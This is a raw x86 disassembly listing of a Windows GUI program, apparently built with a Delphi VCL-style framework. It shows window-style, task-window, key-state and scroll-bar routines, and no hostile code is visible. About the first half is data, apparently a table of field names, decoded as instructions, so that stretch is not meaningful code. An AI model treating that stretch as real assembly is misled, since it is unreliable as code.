or al [ esi + 0x54 ]
add [ eax ] al
push cs
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x726f6853
je r-xdata
add [ esi ] cl
jne r-xdata
popad
imul ebp [ esi + 0x46 ] 0x26d726f
add [ eax ] al
pop eax
inc esp
add [ eax + eax ] bl
add al al
add [ eax ] al
add [ edx ] dl
inc esi
inc ecx
outsb
imul ebp [ esi + 0x67 ] 0xdc000002
pop edx
inc edx
add [ eax + 0xc000000 ] dh
inc esi
push edi
imul ebp [ esi + 0x64 ] 0x6f48776f
outsd
imul esi [ ebx + 0x2 ] 0x0
add ah ah
adc [ eax ] al
mov ah 0x0
add [ eax ] al
or eax [ esi + 0x57 ]
imul ebp [ esi + 0x64 ] 0x694c776f
jae r-xdata
jae r-xdata
outsd
ja r-xdata
add [ esi + 0xd000000 ] ah
inc esi
inc ecx
dec esp
jbe r-xdata
imul ebp [ ebp + 0x65 ] 0x646f4d72
add al [ gs : eax ]
add ah cl
adc [ eax ] al
mov al [ eax ]
add [ eax ] al
or al 0x46
add al 0x20
dec ecx
add [ ecx + 0xa000000 ] cl
inc esi
push esp
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
jne r-xdata
add [ eax + eax + 0x460b0000 ] al
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
jae r-xdata
outsd
jo r-xdata
popad
je r-xdata
add [ edi ] cl
inc esi
inc ebx
jne r-xdata
add al [ eax ]
add ah bl
scasb [ edi ]
inc eax
add [ eax + 0xd000000 ] bh
inc esi
inc esp
imul esp [ ecx + 0x6c ] 0x6148676f
imul ebp [ esi + 0x67 ] 0xf8000002
arpl [ ecx + ebp * 2 + 0x76 ] si
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ 0x6c6c4146 ] cl
insb
add al [ eax ]
add ah bl
pop edx
inc edx
add [ eax + 0xc000000 ] bl
inc esi
push eax
outsd
jo r-xdata
add al [ gs : eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax + eax + 0x46060000 ] cl
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0xdc000002
pop edx
insb
jae r-xdata
inc esi
jb r-xdata
inc esi
dec esp
jo r-xdata
dec ebp
inc esp
insb
popad
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
outsd
inc esp
jb r-xdata
outsb
insb
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
mov esp 0x10000000
popad
dec esp
imul esp [ edx + 0x2 ] 0x10000000
inc eax
add [ eax + eax + 0x460e0000 ] ch
adc [ eax ] al
test al 0x0
jo r-xdata
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x726f6853
je r-xdata
pushfd
adc [ eax ] al
add [ eax ] 0x0
add [ edi ] cl
add [ eax ] al
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
push eax
adc [ eax ] al
rol [ eax ] cl
add [ eax ] al
outsd
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
rol [ eax ] 0x1
add [ eax ] al
adc [ esi + 0x43 ] eax
jb r-xdata
popad
je r-xdata
pushfd
adc [ eax ] al
les eax [ eax ]
add [ eax ] al
or eax [ esi + 0x4d ]
outsd
popad
insb
dec esp
jbe r-xdata
add [ eax ] al
popad
insb
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x536d726f
dec edi
inc ebp
outsb
jne r-xdata
outsb
add [ eax ] al
or eax [ esi + 0x50 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push ebp
jo r-xdata
inc esp
outsd
arpl [ ebx + 0x69 ] bp
outsb
add al [ bx + si ]
add [ eax + edx + 0xc00040 ] bl
add [ eax ] al
adc al [ esi + 0x41 ]
inc ecx
jne r-xdata
inc eax
add [ eax + eax + 0x46100000 ] bh
popad
je r-xdata
ja r-xdata
or [ ecx ] al
add [ eax ] al
popad
je r-xdata
sub [ ecx ] ah
dec ecx
add al dh
add [ eax ] al
jo r-xdata
imul ebp [ edi + 0x6e ] 0x63657845
jne r-xdata
inc edx
popad
jb r-xdata
outsd
jo r-xdata
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
outsb
dec ebp
imul ebp [ esi + 0x46 ] 0x26d726f
add [ eax ] al
add [ eax ] dl
inc eax
add dl dl
add [ eax ] al
insb
add al [ eax ]
add [ eax + edx + 0xc80040 ] bl
add [ eax ] al
cmovbe eax [ ebx + 0x75 ]
jb r-xdata
je r-xdata
je r-xdata
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x69614d6c
outsb
inc esi
outsd
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] 0x2
add ah ah
salc
inc ecx
insb
insb
push edi
imul ebp [ esi + 0x64 ] 0x4f73776f
outsb
inc esi
outsd
jb r-xdata
outsd
jo r-xdata
popad
imul ebp [ esi + 0x46 ] 0x4f6d726f
outsb
push esp
popad
jae r-xdata
jo r-xdata
inc esi
add [ eax ] al
add [ eax ] dl
add al [ fs : eax ]
add [ eax ] al
adc [ eax ] al
lodsd [ esi ]
add [ eax ] al
add [ eax ] cl
inc esi
push edx
add [ eax ] al
clc
jb r-xdata
cmp [ ecx ] al
add [ eax ] al
or eax 0x446e4f46
popad
or al [ esi + 0x4f ]
outsb
dec ebp
jae r-xdata
add [ esi + eax * 2 ] cl
dec edi
outsb
inc ebp
js r-xdata
add al [ eax ]
add [ eax ] ch
and [ ecx ] ecx
[ eax ] al
inc edx
add [ eax ] dl
add [ eax ] eax
add [ 0x4d6e4f46 ] cl
jo r-xdata
enter 0x4923 0x0
fadd [ eax ]
add [ eax ] al
or eax 0x6e774f46
add [ eax ] al
insb
outsb
push ebp
jo r-xdata
add al [ gs : eax ]
add al bh
mov cl 0x48
add al ch
add [ eax ] al
add [ edi ] cl
inc esi
dec edi
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
popad
jae r-xdata
fsubr [ esi + 0xd40040 ]
add [ eax ] al
adc [ esi + 0x4c ] al
add [ eax ] al
ja r-xdata
je r-xdata
outsb
jae r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
inc esi
jbe r-xdata
add al [ eax ]
add al bh
mov cl 0x48
add al ah
add [ eax ] al
add [ eax ] dl
inc esi
dec edi
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
js r-xdata
outsd
jb r-xdata
je r-xdata
push ebx
push ss
inc ecx
jo r-xdata
add [ 0x6e774f46 ] cl
insd
add al [ eax ]
add [ eax ] al
adc [ eax ] al
rol [ eax ] cl
add [ eax ] al
sbb eax 0x756e4546
je r-xdata
jo r-xdata
add [ 0x756e4546 ] bl
outsd
jb r-xdata
add [ eax ] al
or [ esi + 0x54 ] al
jae r-xdata
add al [ eax ]
add [ eax + edx + 0x9c0040 ] bl
add [ eax ] al
or eax [ esi + 0x50 ]
outsd
jo r-xdata
add [ ebx ] cl
inc esi
dec edi
outsb
push ebx
push 0x6948776f
outsb
je r-xdata
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax + 0x1 ] al
add [ eax ] al
or eax [ esi + 0x4f ]
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
aam 0x46
inc edx
add [ eax ] ch
add [ eax ] eax
add [ edi ] al
inc esi
dec edi
outsb
dec eax
imul ebp [ esi + 0x74 ] 0xd0000002
and [ ecx ] ecx
xor [ ecx ] al
add [ eax ] al
inc edx
add [ eax ] bl
add [ eax ] eax
add [ ebx ] cl
add al [ eax ]
add ah dl
inc esi
inc esi
dec edi
outsb
inc edi
imul ebp [ edi + 0x6e ] 0x8c000002
and [ ecx ] ecx
clc
add [ eax ] al
add [ esi ] dl
je r-xdata
push edi
outsb
jae r-xdata
add [ eax ] al
pop es
inc esi
dec edi
outsb
dec ecx
insb
add al [ gs : eax ]
add ah dl
inc esi
inc edx
add [ eax ] bh
add [ eax ] eax
add [ 0x446e4f46 ] cl
add al [ gs : bx + si ]
add ah dl
inc esi
add [ eax ] al
push eax
loope r-xdata
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ ecx + 0x1000049 ] cl
add [ eax ] al
adc al 0x46
inc esi
dec edi
outsb
dec ebp
outsd
inc esi
dec edi
outsb
inc edi
je r-xdata
inc esi
arpl [ ebp + 0x74 ] si
popad
outsd
jo r-xdata
inc esp
add al [ eax ]
add [ eax - 0x33ffb6e0 ] dl
add [ eax ] al
add [ ebx ] cl
inc esi
push eax
adc al [ esi + 0x4d ]
jae r-xdata
dec eax
popad
outsb
insb
inc ebx
jb r-xdata
add [ eax ] al
add [ esi ] cl
inc esi
jo r-xdata
sbb [ ebx ] ah
dec ecx
add [ eax + 0x1 ] ch
add [ eax ] al
adc [ esi + 0x4f ] al
add [ eax ] al
outsb
push ebx
je r-xdata
add [ eax ] dl
inc esi
dec edi
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax + 0x1 ] cl
add [ eax ] al
or eax [ esi + 0x4f ]
outsb
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax + 0x1 ] dl
add [ eax ] al
or al [ esi + 0x4f ]
outsb
push edx
jae r-xdata
outsd
popad
insb
inc edx
imul ebp [ gs : bp + 0x2 ] 0x46d40000
dec ebp
outsd
outsb
add al [ eax ]
add [ ecx + 0xf80049 ] cl
add [ eax ] al
dec eax
add ah bl
add [ eax ] al
add [ 0x696e4946 ] dl
je r-xdata
in al 0xd6
add [ eax ] al
jbe r-xdata
add [ eax ] ah
add [ eax ] eax
add [ edi ] al
inc esi
dec edi
outsb
dec eax
insb
jo r-xdata
popad
insb
inc ebp
outsb
add al [ fs : eax ]
add [ eax - 0x1f ] dl
dec eax
add al [ gs : eax ]
add ah al
and [ ecx ] cl
popad
imul ebp [ esi + 0x46 ] 0x486d726f
popad
outsb
insb
in al 0xe1
dec eax
add al dl
add [ eax ] al
add [ edi ] cl
inc esi
dec ebp
outsd
popad
insb
push eax
insb
insb
jbe r-xdata
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x6e616843
add al [ gs : bx + si ]
add ah bl
outsb
outsd
jb r-xdata
and cl [ ecx ]
pushad
add [ eax ] eax
je r-xdata
add al [ eax ]
add [ ebx + ebp * 4 ] ch
inc esp
add [ eax + 0x5000000 ] ah
inc esi
dec ecx
arpl [ edi + 0x6e ] bp
add al [ eax ]
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] al
add [ edx ] cl
inc esi
push esp
jb r-xdata
insb
jae r-xdata
add [ edi ] cl
inc esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx * 2 + 0x6e ] si
add [ eax ] al
cmovbe ecx [ edi + 0x62 ]
push 0x65
push [ eax + 0x4200492e ]
add ah dh
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
fsubr [ esi + 0x1780040 ]
add [ eax ] al
adc [ esi + 0x50 ] al
outsd
jo r-xdata
add [ eax ] eax
add al [ eax ]
add ah ch
loopne r-xdata
add ah dh
[ edx + 0x2f ]
jo r-xdata
scasb [ edi ]
inc eax
add [ eax + 0x1 ] dh
add [ eax ] al
pop es
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add ah ah
adc [ eax ] al
je r-xdata
add [ eax + 0x1 ] bl
add [ eax ] al
or eax [ esi + 0x4f ]
outsb
push ebx
push 0x4374726f
jne r-xdata
add ah dh
inc [ ebx ]
dec ecx
add [ edx ] al
hlt
outsd
outsb
je r-xdata
add al [ eax ]
add [ eax ] dh
dec ecx
add [ edx ] al
hlt
pop edx
das
outsd
insb
push edi
outsb
add al [ fs : eax ]
add [ eax ] al
adc [ eax ] al
jl r-xdata
sub eax [ eax ]
sub eax r--data
or eax [ eax ]
popfd
sub eax r--data
add [ ebx ] dl
inc esi
dec esi
push esp
outsd
push ebp
outsb
imul ebp [ esi + 0x69 ] 0x6c616974
imul edi [ edx + 0x65 ] 0x2
add [ eax ] al
adc eax [ esi + 0x4e ]
sub_49405c
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongW
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongW
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_4940a8
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
push 0xffffffec
push esi
call GetWindowLongW
mov edi eax
test bl bl
je r-xdata
test bl bl
jne r-xdata
test edi 0x40000
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edi
and eax 0x40000
cmp eax 0x40000
jne r-xdata
push esi
call IsIconic
cmp eax 0x1
sbb eax eax
inc eax
mov [ esp + 0x2 ] al
push esi
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
mov [ esp + 0x1 ] al
movzx eax [ esp + 0x1 ]
or al [ esp + 0x2 ]
je r-xdata
test bl bl
je r-xdata
push 0x0
push esi
call ShowWindow
and edi 0xfffbffff
push edi
push 0xffffffec
push esi
call SetWindowLongW
or edi 0x40000
push edi
push 0xffffffec
push esi
call SetWindowLongW
jmp r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx eax [ esp ]
and al [ esp + 0x1 ]
jne r-xdata
push 0x5
push esi
call ShowWindow
push 0x6
push esi
call ShowWindow
jmp r-xdata
sub_49416c
mov eax [ rw-data ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4a10dc
mov eax [ rw-data ]
call sub_43c47c
mov eax [ rw-data ]
call sub_43c410
retn
xor edx edx
mov eax [ rw-data ]
call sub_49f1fc
sub_4941a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_404204
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_4941f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov ebx sub_4941a8
xor eax eax
push ebp
push sub_4942aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ rw-data ] 0x1
xor eax eax
push ebp
push sub_49426c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4942b1
mov [ rw-data ] 0x0
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4942bc
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_404220
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_4942f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongW
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_494358
push ebx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov ebx sub_4942f4
push 0x0
push ebx
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
pop ebx
retn
mov eax [ rw-data ]
pop ebx
retn
sub_4943b8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4943d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
or edi 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
push ebx
call __imp_GetWindowThreadProcessId
cmp ebx [ esi ]
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor edi edi
mov [ esi + 0x4 ] 0x1
sub_494410
push ebx
add esp 0xfffffff8
mov ebx eax
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
test bl bl
je r-xdata
mov eax esp
push eax
push sub_4943b8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax esp
push eax
push sub_4943d8
call EnumWindows
jmp r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_494454
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_49d570
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_49dabc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_410fc4
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d55c
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49daa8
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_410fc4
test eax eax
je r-xdata
sub_49450c
push ebx
push esi
mov ebx eax
movzx esi [ r-xdata ]
test bl 0x4
je r-xdata
test bl 0x8
je r-xdata
or si 0x1
test bl 0x1
je r-xdata
or si 0x4
test bl 0x2
je r-xdata
or si 0x8
test bl 0x10
je r-xdata
or si 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or si 0x20
mov eax esi
pop esi
pop ebx
retn
or si 0x2
sub_494560
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bx 0x1
test esi 0x20000000
je r-xdata
or bx 0x4
mov eax ebx
pop esi
pop ebx
retn
or bx 0x2
sub_4945a0
push ebx
push esi
mov ebx eax
movzx esi [ r-xdata ]
test [ ebx + 0x10 ] 0x80
je r-xdata
test [ ebx + 0x11 ] 0x80
je r-xdata
or si 0x1
test [ ebx + 0x12 ] 0x80
je r-xdata
or si 0x4
test [ ebx + 0x1 ] 0x80
je r-xdata
or si 0x2
test [ ebx + 0x2 ] 0x80
je r-xdata
or si 0x8
test [ ebx + 0x4 ] 0x80
je r-xdata
or si 0x10
mov eax esi
pop esi
pop ebx
retn
or si 0x20
sub_4945f0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_494650
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4624a8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_407214
mov eax [ ebp - 0x8 ]
mov cl 0x1
pop edx
call sub_4110c0
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_494657
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_494660
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x34 ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
mov esi [ esi + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
pop esi
pop ebx
retn
sub_4946b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_494725
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4946a4
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49472c
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
sub_494734
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4947c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4312cc
mov edi esi
movzx edx [ edi + 0x1c ]
mov eax ebx
call sub_4950a8
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_495084
mov edx [ edi + 0xc ]
mov eax ebx
call sub_494f3c
movzx eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_494818
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4949d8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_471600
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_494f3c
xor edx edx
mov eax ebx
call sub_494f3c
jmp r-xdata
sub_494850
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5d ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5d ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x63 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4948c0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5d ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x63 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
sub_49492c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x274 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_49506c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_475884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_49506c
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_475848
call sub_4948c0
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_475848
call sub_494850
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_4949d8
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_494a10
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_494a44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_494a10
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_494a10
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_494ac0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_494a44
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_47074c
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_494a44
pop ecx
mov ebx eax
